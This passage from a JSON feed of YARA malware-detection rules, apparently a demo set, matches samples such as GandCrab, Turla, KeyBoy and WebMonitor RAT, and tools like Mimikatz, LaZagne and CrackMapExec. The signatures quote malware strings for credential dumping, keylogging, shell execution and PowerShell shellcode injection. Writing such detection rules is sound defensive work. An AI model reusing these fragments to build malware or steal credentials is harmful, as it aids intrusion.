malware","minimum_yara":"1.7","name":"MAL_RedLeaves_Apr18_1_RID2E40","reference":"https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf","required_modules":["pe"],"rule_hash":"a05436e491e372d19b16cbca108eb57b","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_Sednit_DelphiDownloader_Apr18_3_RID33F2 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Sednit Delphi Downloader report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/\"\n      date = \"2018-04-24 15:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"Processor Level: \" fullword ascii\n      $ = \"CONNECTION ERROR\" fullword ascii\n      $ = \"FILE_EXECUTE_AND_KILL_MYSELF\" ascii\n      $ = \"-KILL_PROCESS-\" fullword ascii\n      $ = \"-FILE_EXECUTE-\" fullword ascii\n      $ = \"-DOWNLOAD_ERROR-\" fullword ascii\n      $ = \"CMD_EXECUTE\" fullword ascii\n      $ = \"\\\\Interface\\\\Office\\\\{31E12FE8-937F-1E32-871D-B1C9AOEF4D4}\\\\\" fullword ascii\n      $ = \"Mozilla/3.0 (compatible; Indy Library)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 3 of them\n}","date":"2018-04-24 15:09:31","description":"Detects malware from Sednit Delphi Downloader report","minimum_yara":"1.7","name":"MAL_Sednit_DelphiDownloader_Apr18_3_RID33F2","reference":"https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/","required_modules":[],"rule_hash":"4ad0bced1f4e34cc8e8f9ea2de2753cc","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_GandCrab_Apr18_1_RID2DB7 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects GandCrab malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/MarceloRivero/status/988455516094550017\"\n      date = \"2018-04-23 10:43:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and pe.imphash ( ) == \"7936b0e9491fd747bf2675a7ec8af8ba\"\n}","date":"2018-04-23 10:43:41","description":"Detects GandCrab malware","minimum_yara":"1.7","name":"MAL_GandCrab_Apr18_1_RID2DB7","reference":"https://twitter.com/MarceloRivero/status/988455516094550017","required_modules":["pe"],"rule_hash":"a1cb3694dd0b06edac068fbf74a401ab","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule ProcessInjector_Gen_RID2EA7 : DEMO EXE FILE GEN HKTL {\n   meta:\n      description = \"Detects a process injection utility that can be used ofr good and bad purposes\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/cuckoosandbox/monitor/blob/master/bin/inject.c\"\n      date = \"2018-04-23 11:23:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, HKTL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Error injecting remote thread in process:\" fullword ascii\n      $s5 = \"[-] Error getting access to process: %ld!\" fullword ascii\n      $s6 = \"--process-name <name>  Process name to inject\" fullword ascii\n      $s12 = \"No injection target has been provided!\" fullword ascii\n      $s17 = \"[-] An app path is required when not injecting!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and ( pe.imphash ( ) == \"d27e0fa013d7ae41be12aaf221e41f9b\" or 1 of them ) or 3 of them\n}","date":"2018-04-23 11:23:41","description":"Detects a process injection utility that can be used ofr good and bad purposes","minimum_yara":"1.7","name":"ProcessInjector_Gen_RID2EA7","reference":"https://github.com/cuckoosandbox/monitor/blob/master/bin/inject.c","required_modules":["pe"],"rule_hash":"60cecb6e31198bb728d89e2789b36f46","score":60,"tags":["DEMO","EXE","GEN","FILE","HKTL"]},{"author":"Florian Roth","content":"rule MAL_WebMonitor_RAT_RID2D96 : DEMO EXE FILE MAL T1047 T1057 {\n   meta:\n      description = \"Detects WebMonitor RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/04/unit42-say-cheese-webmonitor-rat-comes-c2-service-c2aas/\"\n      date = \"2018-04-13 10:38:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1047, T1057\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"send_keylog_stream_start\" fullword wide\n      $x2 = \"KEYLOG_STREAM_STOP\" fullword wide\n      $s1 = \"SHELL_EXEC\" fullword wide\n      $s2 = \"send_shell_exec\" fullword wide\n      $s3 = \"send_connections_get\" fullword wide\n      $a1 = \"Select * from Win32_PerfRawData_PerfProc_Process where IDProcess = '\" fullword wide\n      $a2 = \"Select * from Win32_Process WHERE handle =\" fullword wide\n      $a3 = \"Select * from Win32_Process where ProcessId=\" fullword wide\n      $a4 = \"Select * from Win32_ComputerSystem\" fullword wide\n      $a5 = \"The service is in the process of being continued\" fullword wide\n      $a6 = \"tcpdump\" fullword wide\n      $a7 = \"memdump\" fullword wide\n      $a8 = \"<val1>Processor</val1>\" fullword wide\n      $a9 = \"Win32 share process\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or ( 2 of ( $s* ) and 2 of ( $a* ) ) or 7 of them )\n}","date":"2018-04-13 10:38:11","description":"Detects WebMonitor RAT","minimum_yara":"1.7","name":"MAL_WebMonitor_RAT_RID2D96","reference":"https://researchcenter.paloaltonetworks.com/2018/04/unit42-say-cheese-webmonitor-rat-comes-c2-service-c2aas/","required_modules":[],"rule_hash":"25e54e9f05a7c11521dcc9a884f8855b","score":75,"tags":["T1057","T1047","MAL","DEMO","FILE","EXE"]},{"author":"Markus Neis","content":"rule WINNTI_KingSoft_Moz_Confustion_RID328A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Barium sample with Copyright confusion\"\n      author = \"Markus Neis\"\n      reference = \"https://www.virustotal.com/en/file/070ee4a40852b26ec0cfd79e32176287a6b9d2b15e377281d8414550a83f6496/analysis/\"\n      date = \"2018-04-13 14:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( pe.imphash ( ) == \"7f01b23ccfd1017249c36bc1618d6892\" or ( pe.version_info [ \"LegalCopyright\" ] contains \"Mozilla Corporation\" and pe.version_info [ \"ProductName\" ] contains \"Kingsoft\" ) )\n}","date":"2018-04-13 14:09:31","description":"Detects Barium sample with Copyright confusion","minimum_yara":"1.7","name":"WINNTI_KingSoft_Moz_Confustion_RID328A","reference":"https://www.virustotal.com/en/file/070ee4a40852b26ec0cfd79e32176287a6b9d2b15e377281d8414550a83f6496/analysis/","required_modules":["pe"],"rule_hash":"d99e3cbd6c04f4c0625308a5e27bf2cd","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Turla_Agent_BTZ_RID2DEF : DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects Turla Agent.BTZ\"\n      author = \"Florian Roth\"\n      reference = \"https://www.gdatasoftware.com/blog/2014/11/23937-the-uroburos-case-new-sophisticated-rat-identified\"\n      date = \"2018-04-12 10:53:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\" fullword ascii\n      $x3 = \"mstotreg.dat\" fullword ascii\n      $x4 = \"Bisuninst.bin\" fullword ascii\n      $x5 = \"mfc42l00.pdb\" fullword ascii\n      $x6 = \"ielocal~f.tmp\" fullword ascii\n      $s1 = \"%s\\\\1.txt\" fullword ascii\n      $s2 = \"%windows%\" fullword ascii\n      $s3 = \"%s\\\\system32\" fullword ascii\n      $s4 = \"\\\\Help\\\\SYSTEM32\\\\\" fullword ascii\n      $s5 = \"%windows%\\\\mfc42l00.pdb\" fullword ascii\n      $s6 = \"Size of log(%dB) is too big, stop write.\" fullword ascii\n      $s7 = \"Log: Size of log(%dB) is too big, stop write.\" fullword ascii\n      $s8 = \"%02d.%02d.%04d Log begin:\" fullword ascii\n      $s9 = \"\\\\system32\\\\win.com\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2018-04-12 10:53:01","description":"Detects Turla Agent.BTZ","minimum_yara":"1.7","name":"MAL_Turla_Agent_BTZ_RID2DEF","reference":"https://www.gdatasoftware.com/blog/2014/11/23937-the-uroburos-case-new-sophisticated-rat-identified","required_modules":[],"rule_hash":"d4738ae9524e241647acf057010693ab","score":75,"tags":["DEMO","RUSSIA","EXE","FILE","MAL"]},{"author":"Markus Neis","content":"rule Turla_KazuarRAT_RID2CCD : DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects Turla Kazuar RAT described by DrunkBinary\"\n      author = \"Markus Neis\"\n      reference = \"https://twitter.com/DrunkBinary/status/982969891975319553\"\n      date = \"2018-04-08 10:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"~1.EXE\" wide\n      $s2 = \"dl32.dll\" fullword ascii\n      $s3 = \"HookProc@\" ascii\n      $s4 = \"0`.wtf\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( pe.imphash ( ) == \"682156c4380c216ff8cb766a2f2e8817\" or 2 of them )\n}","date":"2018-04-08 10:04:41","description":"Detects Turla Kazuar RAT described by DrunkBinary","minimum_yara":"1.7","name":"Turla_KazuarRAT_RID2CCD","reference":"https://twitter.com/DrunkBinary/status/982969891975319553","required_modules":["pe"],"rule_hash":"ab3353bc76cde790d9d81e8b32e6adda","score":75,"tags":["DEMO","RUSSIA","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Crackmapexec_EXE_RID2D19 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects CrackMapExec hack tool\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-04-06 10:17:21\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"core.scripts.secretsdump(\" fullword ascii\n      $s2 = \"core.scripts.samrdump(\" fullword ascii\n      $s3 = \"core.uacdump(\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 2 of them\n}","date":"2018-04-06 10:17:21","description":"Detects CrackMapExec hack tool","minimum_yara":"1.7","name":"Crackmapexec_EXE_RID2D19","reference":"Internal Research","required_modules":[],"rule_hash":"acc5c292d36402509047e152546bc5cb","score":85,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule SUSP_Imphash_PassRevealer_PY_EXE_RID32FA : DEMO EXE FILE HKTL SUSP T1003 {\n   meta:\n      description = \"Detects an imphash used by password revealer and hack tools\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-04-06 14:28:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, SUSP, T1003\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $fp1 = \"Assmann Electronic GmbH\" ascii wide\n      $fp2 = \"Oculus VR\" ascii wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and pe.imphash ( ) == \"ed61beebc8d019dd9bec823e2d694afd\" and not 1 of ( $fp* )\n}","date":"2018-04-06 14:28:11","description":"Detects an imphash used by password revealer and hack tools","minimum_yara":"1.7","name":"SUSP_Imphash_PassRevealer_PY_EXE_RID32FA","reference":"Internal Research","required_modules":["pe"],"rule_hash":"29e5ad98ad6f8a1588eb37b4d2ad0238","score":40,"tags":["SUSP","DEMO","T1003","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule MAL_Unknown_PWDumper_Apr18_3_RID312A : DEMO EXE FILE HKTL T1003 {\n   meta:\n      description = \"Detects sample from unknown sample set - IL origin\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-04-06 13:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"loaderx86.dll\" fullword ascii\n      $s2 = \"tcpsvcs.exe\" fullword wide\n      $s3 = \"%Program Files, Common FOLDER%\" fullword wide\n      $s4 = \"%AllUsers, ApplicationData FOLDER%\" fullword wide\n      $s5 = \"loaderx86\" fullword ascii\n      $s6 = \"TNtDllHook$\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}","date":"2018-04-06 13:10:51","description":"Detects sample from unknown sample set - IL origin","minimum_yara":"1.7","name":"MAL_Unknown_PWDumper_Apr18_3_RID312A","reference":"Internal Research","required_modules":[],"rule_hash":"6509d5231679ceeb1222a264a95f6093","score":75,"tags":["DEMO","EXE","T1003","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CVE_2014_4076_Exploitcode_RID2F24 : DEMO EXE EXPLOIT FILE T1068 {\n   meta:\n      description = \"Detects an exploit code for CVE-2014-4076\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Neo23x0/yarGen\"\n      date = \"2018-04-04 11:44:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Created a new cmd.exe process\" fullword ascii\n      $x2 = \"[+] Modified shellcode\" fullword ascii\n      $x3 = \"[*] Spawning SYSTEM shell...\" fullword ascii\n      $x4 = \"[*] MS14-070 (CVE-2014-4076) x86\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them\n}","date":"2018-04-04 11:44:31","description":"Detects an exploit code for CVE-2014-4076","minimum_yara":"1.7","name":"CVE_2014_4076_Exploitcode_RID2F24","reference":"https://github.com/Neo23x0/yarGen","required_modules":[],"rule_hash":"00f42062a6535dee548150ea846e1904","score":75,"tags":["EXPLOIT","DEMO","EXE","FILE","T1068"]},{"author":"Florian Roth","content":"rule PowerShell_JAB_B64_RID2D4D : DEMO SCRIPT SUSP T1086 {\n   meta:\n      description = \"Detects base464 encoded $ sign at the beginning of a string\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ItsReallyNick/status/980915287922040832\"\n      date = \"2018-04-02 10:26:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, SUSP, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"('JAB\" ascii wide\n      $s2 = \"powershell\" nocase\n   condition: \n      filesize < 30KB and all of them\n}","date":"2018-04-02 10:26:01","description":"Detects base464 encoded $ sign at the beginning of a string","minimum_yara":"1.7","name":"PowerShell_JAB_B64_RID2D4D","reference":"https://twitter.com/ItsReallyNick/status/980915287922040832","required_modules":[],"rule_hash":"a3d7993cee55dbaed475a0ce551062ea","score":60,"tags":["SUSP","DEMO","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule SUSP_PowerShell_String_K32_RemProcess_RID3507 : DEMO FILE SCRIPT SUSP T1064 T1086 {\n   meta:\n      description = \"Detects suspicious PowerShell code that uses Kernel32, RemoteProccess handles or shellcode\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nccgroup/redsnarf\"\n      date = \"2018-03-31 15:55:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, SUSP, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Throw \\\"Unable to allocate memory in the remote process for shellcode\\\"\" fullword ascii\n      $x2 = \"$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\\\"kernel32.dll\\\")\" fullword ascii\n      $s3 = \"$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.\" ascii\n      $s7 = \"if ($RemoteProcHandle -eq [IntPtr]::Zero)\" fullword ascii\n      $s8 = \"if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))\" fullword ascii\n      $s9 = \"$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, \" ascii\n      $s15 = \"$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x7566 and filesize < 6000KB and 1 of them\n}","date":"2018-03-31 15:55:41","description":"Detects suspicious PowerShell code that uses Kernel32, RemoteProccess handles or shellcode","minimum_yara":"1.7","name":"SUSP_PowerShell_String_K32_RemProcess_RID3507","reference":"https://github.com/nccgroup/redsnarf","required_modules":[],"rule_hash":"80e6addb6d5b52ccc4ef6ff7ee8218b2","score":75,"tags":["SUSP","T1064","SCRIPT","DEMO","T1086","FILE"]},{"author":"Markus Neis, Florian Roth","content":"rule KeyBoy_InstallClient_RID2EF9 : APT DEMO EXE FILE T1085 T1197 {\n   meta:\n      description = \"Detects KeyBoy InstallClient\"\n      author = \"Markus Neis, Florian Roth\"\n      reference = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n      date = \"2018-03-26 11:37:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1085, T1197\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"egsvr32.exe \\\"/u bitsadmin /canceft\\\\windows\\\\currebitsadmin\" ascii\n      $x2 = \"/addfibitsadmin /Resumbitsadmin /SetNosoftware\\\\microsotifyCmdLine \" ascii\n      $x3 = \"D:\\\\Work\\\\Project\\\\VS\\\\house\\\\Apple\\\\\" ascii\n      $x4 = \"Bj+I11T6z9HFMG5Z5FMT/u62z9zw8FyWV0xrcK7HcYXkiqnAy5tc/iJuKtwM8CT3sFNuQu8xDZQGSR6D8/Bc/Dpuz8gMJFz+IrYqNAzwuPIitg==\" fullword ascii\n      $x5 = \"szCmd1:%s\" fullword ascii\n      $s1 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n      $s4 = \"rundll32.exe %s Main\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2018-03-26 11:37:21","description":"Detects KeyBoy InstallClient","minimum_yara":"1.7","name":"KeyBoy_InstallClient_RID2EF9","reference":"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/","required_modules":[],"rule_hash":"88df7bec01a7632c0587ceb2d201877b","score":75,"tags":["DEMO","FILE","APT","T1085","T1197","EXE"]},{"author":"Markus Neis, Florian Roth","content":"rule KeyBoy_wab32res_RID2CAC : APT DEMO EXE FILE T1197 {\n   meta:\n      description = \"Detects KeyBoy Loader wab32res.dll\"\n      author = \"Markus Neis, Florian Roth\"\n      reference = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n      date = \"2018-03-26 09:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1197\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"B4490-2314-55C1- /Processid:{321bitsadmin /canceft\\\\windows\\\\curresoftware\\\\microso\" fullword ascii\n      $x2 = \"D:\\\\Work\\\\VS\\\\House\\\\TSSL\\\\TSSL\\\\TClient\" ascii\n      $x3 = \"\\\\Release\\\\FakeRun.pdb\" ascii\n      $x4 = \"FakeRun.dll\" fullword ascii\n      $s1 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n      $s2 = \"CreateProcess failed (%d)\" fullword ascii\n      $s3 = \"CreateProcess %s \" fullword ascii\n      $s4 = \"FindResource %s error \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2018-03-26 09:59:11","description":"Detects KeyBoy Loader wab32res.dll","minimum_yara":"1.7","name":"KeyBoy_wab32res_RID2CAC","reference":"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/","required_modules":[],"rule_hash":"8521077ff91451e4f60b6c25d52b49b1","score":75,"tags":["APT","DEMO","EXE","T1197","FILE"]},{"author":"Markus Neis, Florian Roth","content":"rule KeyBoy_rasauto_RID2CC2 : APT DEMO EXE FILE T1035 T1085 {\n   meta:\n      description = \"Detects KeyBoy ServiceClient\"\n      author = \"Markus Neis, Florian Roth\"\n      reference = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n      date = \"2018-03-26 10:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1035, T1085\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"rundll32.exe %s SSSS & exit\" fullword ascii\n      $x2 = \"D:\\\\Work\\\\Project\\\\VS\\\\HSSL\\\\HSSL_Unicode _2\\\\Release\\\\ServiceClient.pdb\" fullword ascii\n      $s1 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n      $s2 = \"CreateProcess failed (%d)\" fullword ascii\n      $s3 = \"ServiceClient.dll\" fullword ascii\n      $s4 = \"NtWow64QueryInformationProcess64 failed\" fullword ascii\n      $s5 = \"pid:%d CmdLine:%S\" fullword ascii\n      $s6 = \"rasauto32.ServiceMain\" fullword ascii\n      $s7 = \"del /q/f %s\\\\%s*\" fullword ascii\n      $s8 = \"szTmpDll:%s\" fullword ascii\n      $s9 = \"lpCmdLine:%s\" fullword ascii\n      $s0 = \"ReleaseFileFromRes:%s ok!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.exports ( \"SSSS\" ) or 1 of ( $x* ) or 4 of them )\n}","date":"2018-03-26 10:02:51","description":"Detects KeyBoy ServiceClient","minimum_yara":"1.7","name":"KeyBoy_rasauto_RID2CC2","reference":"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/","required_modules":["pe"],"rule_hash":"bbea488b3e42de4a6d271ba0729b1f8e","score":75,"tags":["T1035","DEMO","FILE","APT","T1085","EXE"]},{"author":"Markus Neis, Florian Roth","content":"rule KeyBoy_876_0x4e20000_RID2CFA : APT DEMO EXE FILE MAL T1085 {\n   meta:\n      description = \"Detects KeyBoy Backdoor\"\n      author = \"Markus Neis, Florian Roth\"\n      reference = \"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/\"\n      date = \"2018-03-26 10:12:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\rundll32.exe %s ServiceTake %s %s\" fullword ascii\n      $x2 = \"#%sCmd shell is not running,or your cmd is error!\" fullword ascii\n      $x3 = \"Take Screen Error,May no user login!\" fullword ascii\n      $x4 = \"Get logon user fail!\" fullword ascii\n      $x5 = \"8. LoginPasswd:%s\" fullword ascii\n      $x6 = \"Take Screen Error,service dll not exists\" fullword ascii\n      $s1 = \"taskkill /f /pid %s\" fullword ascii\n      $s2 = \"TClient.exe\" fullword ascii\n      $s3 = \"%s\\\\wab32res.dll\" fullword ascii\n      $s4 = \"%s\\\\rasauto.dll\" fullword ascii\n      $s5 = \"Download file:%s index:%d\" fullword ascii\n      $s6 = \"LogonUser: [%s]\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2018-03-26 10:12:11","description":"Detects KeyBoy Backdoor","minimum_yara":"1.7","name":"KeyBoy_876_0x4e20000_RID2CFA","reference":"https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/","required_modules":[],"rule_hash":"a6cfcbf0019c12adcff8b635b065c966","score":75,"tags":["MAL","DEMO","FILE","APT","T1085","EXE"]},{"author":"Markus Neis, Florian Roth","content":"rule Lazagne_PW_Dumper_RID2DA5 : DEMO HKTL T1003 {\n   meta:\n      description = \"Detects Lazagne PW Dumper\"\n      author = \"Markus Neis, Florian Roth\"\n      reference = \"https://github.com/AlessandroZ/LaZagne/releases/\"\n      date = \"2018-03-22 10:40:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Crypto.Hash\" fullword ascii\n      $s2 = \"laZagne\" fullword ascii\n      $s3 = \"impacket.winregistry\" fullword ascii\n   condition: \n      3 of them\n}","date":"2018-03-22 10:40:41","description":"Detects Lazagne PW Dumper","minimum_yara":"1.7","name":"Lazagne_PW_Dumper_RID2DA5","reference":"https://github.com/AlessandroZ/LaZagne/releases/","required_modules":[],"rule_hash":"d474972f183e90b1502f6a95f2eec61b","score":70,"tags":["DEMO","T1003","HKTL"]},{"author":"Markus Neis","content":"rule Impacket_Lateral_Movement_RID310D : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects Impacket Network Aktivity for Lateral Movement\"\n      author = \"Markus Neis\"\n      reference = \"https://github.com/CoreSecurity/impacket\"\n      date = \"2018-03-22 13:06:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"impacket.dcerpc.v5.transport(\" fullword ascii\n      $s2 = \"impacket.smbconnection(\" fullword ascii\n      $s3 = \"impacket.dcerpc.v5.ndr(\" fullword ascii\n      $s4 = \"impacket.spnego(\" fullword ascii\n      $s5 = \"impacket.smb(\" fullword ascii\n      $s6 = \"impacket.ntlm(\" fullword ascii\n      $s7 = \"impacket.nmb(\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 14000KB and 2 of them\n}","date":"2018-03-22 13:06:01","description":"Detects Impacket Network Aktivity for Lateral Movement","minimum_yara":"1.7","name":"Impacket_Lateral_Movement_RID310D","reference":"https://github.com/CoreSecurity/impacket","required_modules":[],"rule_hash":"3c01b9435d3d523d1a0c3810225c9d5d","score":60,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth, Markus Neis","content":"rule Chafer_Mimikatz_Custom_RID2FD9 : APT DEMO EXE FILE MIDDLE_EAST T1003 T1075 T1097 T1178 {\n   meta:\n      description = \"Detects Custom Mimikatz Version\"\n      author = \"Florian Roth, Markus Neis\"\n      reference = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n      date = \"2018-03-22 12:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST, T1003, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\win7p\\\\Documents\\\\mi-back\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them\n}","date":"2018-03-22 12:14:41","description":"Detects Custom 